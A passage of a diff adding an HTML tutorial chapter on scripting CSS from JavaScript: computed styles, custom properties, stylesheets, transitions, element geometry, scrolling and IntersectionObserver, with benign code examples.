+styles.fontSize;   // e.g. "16px" -- always resolved to absolute pixel units</code></pre>
+      </div>
+      <p>
+        A computed <code>CSSStyleDeclaration</code> differs from an inline
+        one in several important ways:
+      </p>
+      <ul>
+        <li>It is entirely <strong>read-only</strong> &mdash; assigning to it does nothing (or throws, depending on the property).</li>
+        <li>
+          Values are <strong>absolute</strong>: relative units
+          (percentages, <code>em</code>, <code>pt</code>) are resolved to
+          pixels, and colors come back as <code>rgb()</code>/<code>rgba()</code>
+          strings.
+        </li>
+        <li>
+          <strong>Shortcut properties don't resolve</strong> &mdash; querying
+          <code>margin</code> or <code>border</code> gets you nothing useful;
+          query the fully expanded longhands (<code>marginLeft</code>,
+          <code>marginTop</code>, <code>borderLeftWidth</code>, etc.)
+          instead.
+        </li>
+        <li><code>cssText</code> is <code>undefined</code> on a computed style.</li>
+      </ul>
+      <div class="admonition tip">
+        <div class="admonition-title">Computed styles can still surprise you</div>
+        <p>
+          Querying <code>fontFamily</code> just returns whatever
+          comma-separated font stack was specified in CSS (e.g.
+          <code>"arial, helvetica, sans-serif"</code>) &mdash; it does not
+          tell you which typeface the browser actually picked. And if an
+          element isn't absolutely positioned, its computed
+          <code>top</code>/<code>left</code> often just comes back as the
+          literal string <code>"auto"</code>. For position and size, prefer
+          <code>getBoundingClientRect()</code> (below) over parsing computed
+          styles at all.
+        </p>
+      </div>
+
+      <h3 id="css-custom-properties">CSS custom properties (variables) <span class="badge new">Modern CSS</span></h3>
+      <p>
+        CSS custom properties &mdash; written <code>--like-this</code> and
+        read with <code>var(--like-this)</code> &mdash; participate in the
+        same style APIs as ordinary properties, just addressed by string name
+        instead of a camelCase identifier (a JS property name can't start
+        with two hyphens). You read and write them with
+        <code>getPropertyValue()</code>/<code>setProperty()</code> on either
+        an inline or a computed style object:
+      </p>
+      <div class="code-block" data-lang="CSS">
+<pre><code class="language-css">:root {
+  --accent-color: #6366f1;
+  --gap: 12px;
+}
+.card { border-color: var(--accent-color); padding: var(--gap); }</code></pre>
+      </div>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let root = document.documentElement;
+
+// write: instantly repaints every rule that references var(--accent-color)
+root.style.setProperty("--accent-color", "#ef4444");
+
+// read the value as authored on an inline style (may be empty if it's only
+// set in a stylesheet rather than inline)
+root.style.getPropertyValue("--accent-color");
+
+// read the RESOLVED value, wherever it was actually set
+getComputedStyle(root).getPropertyValue("--accent-color").trim(); // "#ef4444"</code></pre>
+      </div>
+      <p>
+        This is the standard mechanism behind JavaScript-driven theming:
+        flip a handful of custom properties on <code>:root</code> and every
+        rule written in terms of <code>var(--...)</code> updates at once,
+        without touching individual elements' styles.
+      </p>
+
+      <h3 id="scripting-stylesheets">Scripting stylesheets themselves</h3>
+      <p>
+        Beyond individual elements, JavaScript can manipulate entire
+        stylesheets. A <code>&lt;style&gt;</code> or
+        <code>&lt;link rel="stylesheet"&gt;</code> tag is just a regular
+        element you can select with <code>querySelector()</code>, and both
+        expose a <code>disabled</code> property that flips the whole
+        stylesheet on or off:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function toggleTheme() {
+  let lightTheme = document.querySelector("#light-theme");
+  let darkTheme = document.querySelector("#dark-theme");
+  if (darkTheme.disabled) {
+    lightTheme.disabled = true;
+    darkTheme.disabled = false;
+  } else {
+    lightTheme.disabled = false;
+    darkTheme.disabled = true;
+  }
+}</code></pre>
+      </div>
+      <p>
+        You can also insert a whole new stylesheet at runtime, either as a
+        <code>&lt;link&gt;</code>:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function setTheme(name) {
+  let link = document.createElement("link");
+  link.id = "theme";
+  link.rel = "stylesheet";
+  link.href = `themes/${name}.css`;
+
+  let current = document.querySelector("#theme");
+  current ? current.replaceWith(link) : document.head.append(link);
+}</code></pre>
+      </div>
+      <p>
+        or by injecting a <code>&lt;style&gt;</code> block's markup directly
+        (fine here because the content is developer-authored, not user
+        input &mdash; see the innerHTML warning above):
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">document.head.insertAdjacentHTML(
+  "beforeend",
+  "&lt;style&gt;body{transform:rotate(180deg)}&lt;/style&gt;"
+);</code></pre>
+      </div>
+      <p>
+        Loaded stylesheets are also reachable programmatically through
+        <code>document.styleSheets</code>, an array-like list of
+        <code>CSSStyleSheet</code> objects (one per <code>&lt;style&gt;</code>/
+        <code>&lt;link&gt;</code>). Each has a <code>.cssRules</code> list of
+        the individual rules it contains, and you can add or remove rules at
+        runtime with <code>insertRule()</code>/<code>deleteRule()</code>:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let sheet = document.styleSheets[0];
+sheet.insertRule(".flash { background: yellow; }", sheet.cssRules.length);
+console.log(sheet.cssRules[0].selectorText); // e.g. "body"
+sheet.deleteRule(0);                          // remove the first rule</code></pre>
+      </div>
+      <div class="admonition note">
+        <div class="admonition-title">A same-origin restriction applies</div>
+        <p>
+          <code>cssRules</code> throws a security exception for stylesheets
+          loaded cross-origin without appropriate CORS headers &mdash; you
+          can read the rules of a stylesheet from your own origin, but not
+          arbitrarily inspect one loaded from someone else's CDN. This full
+          rule-level API (formally the "CSS Object Model") is deep enough
+          that most applications never need more than
+          <code>disabled</code>, class toggling, and custom properties.
+        </p>
+      </div>
+
+      <h3 id="css-transitions-and-animations">CSS transitions and animations from script</h3>
+      <p>
+        Given a stylesheet that pairs a transition with a class change:
+      </p>
+      <div class="code-block" data-lang="CSS">
+<pre><code class="language-css">.transparent { opacity: 0; }
+.fadeable { transition: opacity .5s ease-in; }</code></pre>
+      </div>
+      <p>
+        script can trigger a fully browser-driven animation just by flipping
+        the class &mdash; no JavaScript-side animation loop required:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// element already has class="fadeable notification"
+document.querySelector("#subscribe").classList.add("transparent");
+// opacity animates from 1 to 0 over half a second; removing the class
+// later fades it back in, since the transition applies either direction</code></pre>
+      </div>
+      <p>
+        JavaScript can also observe a transition's progress via events fired
+        on the animated element: <code>transitionrun</code> (fires as soon
+        as the transition is triggered, even before any visual change, if
+        <code>transition-delay</code> is set), <code>transitionstart</code>
+        (visual change begins), and <code>transitionend</code> (complete).
+        Handlers receive a <code>TransitionEvent</code> with
+        <code>propertyName</code> (which CSS property animated) and
+        <code>elapsedTime</code> (seconds since the transition started).
+        Full keyframe-based <strong>CSS Animations</strong> (the
+        <code>animation-name</code>/<code>animation-duration</code>
+        properties plus an <code>@keyframes</code> rule) work the same way
+        from script's perspective: add the class, let CSS run it, and listen
+        for <code>animationstart</code>, <code>animationiteration</code>
+        (fires after each repeat except the last), and
+        <code>animationend</code>, whose <code>AnimationEvent</code> objects
+        carry <code>animationName</code> and <code>elapsedTime</code>.
+      </p>
+
+      <h2 id="document-viewport-coordinates">Document, viewport, and container coordinates</h2>
+      <p>
+        Every element's rendered position is measured in CSS pixels, x
+        increasing rightward and y increasing downward &mdash; but relative
+        to <em>what</em> origin? The DOM distinguishes two coordinate
+        systems: <strong>document coordinates</strong> (relative to the
+        top-left corner of the whole document) and
+        <strong>viewport coordinates</strong> (relative to the top-left
+        corner of the visible portion of the window, or of the enclosing
+        <code>&lt;iframe&gt;</code> for nested documents; also called "window
+        coordinates"). If the page hasn't been scrolled, the two coincide;
+        once it has, you must add or subtract the scroll offset to convert
+        between them &mdash; an element sitting at document y = 200 appears
+        at viewport y = 125 once the user has scrolled down 75px.
+      </p>
+      <p>
+        In principle a printed-page mental model suggests every element
+        should have one unique position in document coordinates. In practice
+        that breaks down: CSS <code>overflow</code> lets any element become
+        its own scrollable viewport for its content, so there is no single
+        global document coordinate space once nested scrolling is involved.
+        For this reason, client-side JavaScript overwhelmingly uses viewport
+        coordinates &mdash; <code>getBoundingClientRect()</code> (below) and
+        the <code>clientX</code>/<code>clientY</code> properties of mouse and
+        pointer events are both viewport-relative.
+      </p>
+      <p>
+        This also matters for CSS positioning: <code>position:fixed</code>'s
+        <code>top</code>/<code>left</code> are viewport-relative;
+        <code>position:relative</code> is relative to the element's own
+        normal-flow position; <code>position:absolute</code> is relative to
+        the document, or to the nearest positioned ancestor if there is one.
+        A common pattern is a <code>position:relative</code> wrapper with
+        <code>top:0; left:0</code> (so it doesn't otherwise affect layout)
+        purely to establish a local origin &mdash; "container coordinates"
+        &mdash; for absolutely positioned children inside it.
+      </p>
+      <div class="admonition note">
+        <div class="admonition-title">CSS pixels aren't hardware pixels</div>
+        <p>
+          On high-density ("retina") displays, one CSS pixel typically maps
+          to several physical device pixels. <code>window.devicePixelRatio</code>
+          reports that ratio (e.g. <code>2</code> means each CSS pixel is a
+          2&times;2 block of hardware pixels), and it need not be an integer
+          &mdash; which is also why fractional CSS coordinates like
+          <code>3.33px</code> are legal and meaningful rather than rounding
+          artifacts.
+        </p>
+      </div>
+
+      <h2 id="element-geometry-deep-dive">
+        Measuring an element: the offset/client/scroll trio
+        <span class="badge hard">Hard part</span>
+      </h2>
+      <p>
+        The most reliable way to get an element's on-screen box is
+        <code>getBoundingClientRect()</code>: it takes no arguments and
+        returns an object with <code>left</code>, <code>top</code>,
+        <code>right</code>, <code>bottom</code>, <code>width</code>, and
+        <code>height</code>, all in <strong>viewport</strong> coordinates,
+        including border and padding but excluding margin.
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let rect = el.getBoundingClientRect();
+// viewport-relative -- add the scroll offset for document-relative values:
+let docTop = rect.top + window.scrollY;
+let docLeft = rect.left + window.scrollX;</code></pre>
+      </div>
+      <p>
+        Block elements (images, <code>&lt;div&gt;</code>s, paragraphs) always
+        lay out as one rectangle. Inline elements (<code>&lt;span&gt;</code>,
+        <code>&lt;code&gt;</code>, <code>&lt;b&gt;</code>) can wrap across
+        multiple lines and so occupy multiple disjoint rectangles;
+        <code>getBoundingClientRect()</code> on one of those returns a single
+        rectangle spanning the full bounding box (so it can look
+        surprisingly wide/tall), while <code>getClientRects()</code> returns
+        the individual per-line rectangles.
+      </p>
+      <p>
+        That covers <em>where</em> an element is. <em>How big</em> it is
+        gets more nuanced, because "size" can mean four genuinely different
+        things depending on whether you count borders, padding, or
+        overflowing content. Every element exposes three parallel triads of
+        properties:
+      </p>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Property pair</th><th>Includes</th><th>Excludes</th></tr>
+          <tr><td><code>offsetWidth</code> / <code>offsetHeight</code></td><td>content + padding + border</td><td>margin</td></tr>
+          <tr><td><code>clientWidth</code> / <code>clientHeight</code></td><td>content + padding</td><td>border, margin, scrollbar</td></tr>
+          <tr><td><code>scrollWidth</code> / <code>scrollHeight</code></td><td>content + padding + any overflowing content</td><td>border, margin</td></tr>
+        </table>
+      </div>
+      <p>
+        In words: <code>offsetWidth</code> is the full visible box including
+        its border &mdash; the largest of the three when there's no
+        overflow. <code>clientWidth</code> peels the border back off, giving
+        you just the padded content area (useful for computing available
+        content space). <code>scrollWidth</code> is the size of the content
+        area <em>as if nothing were clipped</em> &mdash; when content fits
+        without scrolling, <code>scrollWidth === clientWidth</code>; the
+        moment content overflows, <code>scrollWidth</code> grows larger than
+        <code>clientWidth</code> to describe the full (including
+        off-screen) content extent. This is exactly how you detect that an
+        element is actually scrollable:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">function isOverflowing(el) {
+  return el.scrollWidth &gt; el.clientWidth || el.scrollHeight &gt; el.clientHeight;
+}
+
+// how much MORE could this box scroll horizontally?
+function maxScrollLeft(el) {
+  return el.scrollWidth - el.clientWidth;
+}</code></pre>
+      </div>
+      <p>
+        Each triad has a matching left/top pair:
+        <code>offsetLeft</code>/<code>offsetTop</code> give an element's
+        position relative to its <code>offsetParent</code> (usually the
+        nearest positioned ancestor, or the document for many ordinary
+        elements &mdash; <em>not</em> always the viewport, unlike
+        <code>getBoundingClientRect()</code>);
+        <code>clientLeft</code>/<code>clientTop</code> are almost always just
+        the element's left/top border width; and
+        <code>scrollLeft</code>/<code>scrollTop</code> are the
+        <strong>only writable</strong> members of the whole group &mdash;
+        assigning to them scrolls the element's own content within itself.
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// scroll a custom-scrolling panel to its bottom
+panel.scrollTop = panel.scrollHeight - panel.clientHeight;</code></pre>
+      </div>
+      <div class="admonition warning">
+        <div class="admonition-title">Don't mix these up: two worked comparisons</div>
+        <p>
+          <strong>1. A 200px-wide box with 20px padding and a 5px border,
+          no overflow:</strong> <code>offsetWidth</code> is 250 (200 + 2&times;20 padding + 2&times;5 border),
+          <code>clientWidth</code> is 240 (200 + 2&times;20 padding, border excluded),
+          and <code>scrollWidth</code> is also 240, since nothing overflows.
+        </p>
+        <p>
+          <strong>2. The same box, but its content is actually 400px tall
+          and clips:</strong> <code>offsetHeight</code> and
+          <code>clientHeight</code> are unchanged (they describe the box's
+          own allotted size, not its content), but
+          <code>scrollHeight</code> jumps to reflect the full 400px+padding
+          of content that exists, only some of which is currently visible.
+          The gap between <code>scrollHeight</code> and
+          <code>clientHeight</code> is precisely how far the element can be
+          scrolled vertically.
+        </p>
+      </div>
+      <p>
+        Inline elements (<code>&lt;span&gt;</code>, <code>&lt;code&gt;</code>,
+        etc.) return <code>0</code> for all of the <code>client*</code>
+        properties, since they don't participate in block layout the same
+        way.
+      </p>
+
+      <h3 id="element-at-point">Finding the element at a point</h3>
+      <p>
+        <code>getBoundingClientRect()</code> goes from element to position.
+        <code>document.elementFromPoint(x, y)</code> goes the other way,
+        taking viewport coordinates (the same system as a mouse event's
+        <code>clientX</code>/<code>clientY</code>) and returning whichever
+        element is rendered at that point &mdash; specifically the
+        innermost, topmost-stacked (highest effective <code>z-index</code>)
+        element there, though the exact hit-testing algorithm isn't tightly
+        specified across browsers.
+      </p>
+
+      <h2 id="scrolling">Scrolling</h2>
+      <p>
+        <code>window.scrollTo(x, y)</code> takes <strong>document</strong>
+        coordinates and scrolls so that point sits in the viewport's
+        upper-left corner (clamped if the document doesn't have enough
+        content left to fully satisfy that near an edge):
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let documentHeight = document.documentElement.offsetHeight;
+let viewportHeight = window.innerHeight;
+window.scrollTo(0, documentHeight - viewportHeight); // jump to the last "page"</code></pre>
+      </div>
+      <p>
+        <code>window.scrollBy(dx, dy)</code> is the relative version, adding
+        to the current scroll position rather than setting an absolute one
+        &mdash; handy, but easy to misuse:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">// scrolls 50px down every 500ms -- note there is no built-in way to STOP this;
+// you must keep the interval id and call clearInterval() yourself
+let scrollTimer = setInterval(() =&gt; scrollBy(0, 50), 500);</code></pre>
+      </div>
+      <p>
+        Both accept a single options object instead of two numbers when you
+        want the browser to animate the scroll rather than jump instantly:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">window.scrollTo({ left: 0, top: documentHeight - viewportHeight, behavior: "smooth" });</code></pre>
+      </div>
+      <p>
+        Most of the time, though, you don't want a numeric offset at all
+        &mdash; you want a specific element visible. <code>element.scrollIntoView()</code>
+        handles that, scrolling (vertically and, if needed, horizontally) so
+        the element becomes visible. Called with no arguments it aligns the
+        element's top edge near the top of the viewport; called with the
+        single argument <code>false</code> it aligns the bottom edge to the
+        bottom instead. The object form gives finer control:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">el.scrollIntoView({
+  behavior: "smooth",   // animate rather than jump
+  block: "center",      // vertical alignment: "start" | "center" | "end" | "nearest"
+  inline: "nearest",    // horizontal alignment, same set of values
+});</code></pre>
+      </div>
+
+      <h3 id="viewport-and-content-size">Viewport size, content size, and scroll position</h3>
+      <p>
+        For the top-level window, <code>window.innerWidth</code>/
+        <code>window.innerHeight</code> give the viewport size (mobile pages
+        often pair this with a <code>&lt;meta name="viewport"&gt;</code> tag
+        to declare their intended layout width). The overall document size
+        is the size of <code>document.documentElement</code> (the
+        <code>&lt;html&gt;</code> element) &mdash; call
+        <code>getBoundingClientRect()</code> on it, or read its
+        <code>offsetWidth</code>/<code>offsetHeight</code>. The window's
+        current scroll offset is available read-only as
+        <code>window.scrollX</code>/<code>window.scrollY</code> (use
+        <code>scrollTo()</code> to change it, not direct assignment, since
+        these properties can't be set). Individual scrollable elements have
+        their own <code>scrollLeft</code>/<code>scrollTop</code>, which
+        &mdash; unlike the window versions &mdash; <em>are</em> directly
+        writable, as shown in the geometry section above. Most (but not
+        historically all) browsers also support <code>el.scrollTo()</code>/
+        <code>el.scrollBy()</code> directly on individual elements, mirroring
+        the <code>Window</code> methods.
+      </p>
+
+      <h2 id="intersection-observer">
+        IntersectionObserver: efficient visibility detection
+        <span class="badge new">Modern API</span>
+      </h2>
+      <p>
+        A recurring need &mdash; infinite-scroll loading, lazy-loading
+        images, "reveal on scroll" animations, ad-viewability tracking
+        &mdash; is knowing when an element scrolls into (or out of) view.
+        Doing this by hand means listening to <code>scroll</code> events and
+        calling <code>getBoundingClientRect()</code> on every handler
+        invocation, which fires dozens of times per second and forces
+        layout recalculation on each call. <code>IntersectionObserver</code>
+        replaces that pattern with an asynchronous, browser-managed
+        callback that only fires when an element's visibility actually
+        crosses a threshold:
+      </p>
+      <div class="code-block" data-lang="JavaScript">
+<pre><code class="language-javascript">let observer = new IntersectionObserver((entries) =&gt; {
+  for (let entry of entries) {
+    if (entry.isIntersecting) {
+      entry.target.classList.add("visible");   // e.g. trigger a reveal animation
+    } else {
+      entry.target.classList.remove("visible");
+    }
+  }
+}, {
+  root: null,          // null = the browser viewport; or pass a scrolling ancestor element
+  rootMargin: "0px",   // grow/shrink the root's bounds before computing intersection
+  threshold: 0.25,     // fire once at least 25% of the target is visible
+});
+
+document.querySelectorAll(".reveal-on-scroll").forEach((el) =&gt; observer.observe(el));
+
+// stop watching an element (e.g. once it has been revealed):
+// observer.unobserve(el);
+// or tear down the whole observer:
+// observer.disconnect();</code></pre>
+      </div>
+      <p>
+        Each <code>entry</code> also carries
+        <code>entry.intersectionRatio</code> (how much of the target is
+        currently visible, 0&ndash;1) and
+        <code>entry.boundingClientRect</code>, so you rarely need to call
+        <code>getBoundingClientRect()</code> yourself once an observer is in
+        place. Because the callback is asynchronous and batched by the
+        browser's own rendering pipeline, it stays cheap even when observing
+        hundreds of elements &mdash; a common pattern for lazy-loading images
+        below the fold, or for infinite-scroll pagination by observing a
+        sentinel element at the bottom of a list.
+      </p>
+
+      <div class="admonition tip">
+        <div class="admonition-title">Where to next</div>
+        <p>
+          Custom, encapsulated components built from these same DOM/CSS
+          primitives (plus Shadow DOM) are covered in
+          <a href="18-components-graphics.html">Components &amp; Graphics</a>.
+          Event handling and propagation &mdash; how <code>event.target</code>
+          gets set in the first place, and how delegation via
+          <code>closest()</code> plugs into it &mdash; lives in
+          <a href="16-web-basics-events.html">Web Basics &amp; Events</a>.
+        </p>
+      </div>
+
+
+      <div class="page-nav" id="page-nav"></div>
+    </main>
+
+    <aside class="toc" id="toc">
+      <div class="toc-inner">
+        <div class="toc-title">On this page</div>
+        <ul id="toc-list"></ul>
+      </div>
+    </aside>
+  </div>
+</div>
+
+<div class="search-overlay" id="search-overlay">
+  <div class="search-box">
+    <input id="search-input" type="text" placeholder="Search chapters..." autocomplete="off" />
+    <div class="search-results" id="search-results"></div>
+  </div>
+</div>
+
+<script src="../assets/js/nav-data.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/typescript.min.js"></script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
